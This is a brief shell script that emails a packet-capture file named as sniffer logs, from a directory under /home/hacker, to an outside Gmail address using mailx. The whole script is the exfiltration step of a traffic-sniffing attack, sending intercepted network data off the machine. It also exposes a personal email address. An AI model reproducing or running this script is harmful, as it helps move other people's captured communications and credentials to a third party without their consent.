#

#Variables
EMAIL="ethan.hilmen@gmail.com"
SUBJECT="Email_Sniffer_Log"
BODY="Please see the attached File"
ATTACHMENT="/home/hacker/sniff_logs.pcap"

#send email
echo "$BODY" | mailx -s "$SUBJECT" -a "$ATTACHMENT" "$EMAIL"
